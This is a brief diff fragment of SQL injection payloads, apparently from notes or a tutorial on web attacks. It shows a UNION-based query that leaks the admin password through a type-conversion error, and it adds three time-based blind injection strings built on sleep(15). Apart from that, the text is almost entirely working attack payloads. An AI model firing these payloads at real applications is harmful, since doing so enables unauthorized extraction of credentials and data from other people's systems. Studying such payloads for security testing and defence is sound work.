@@ -21,3 +21,7 @@ SELECT Title, Body FROM Emails
 WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'
 UNION SELECT 1,
 CONVERT((SELECT Password FROM Users WHERE Username="admin"), DATE);--
+
+' or sleep(15) and 1=1#
+' or sleep(15)#
+' union select sleep(15),null#
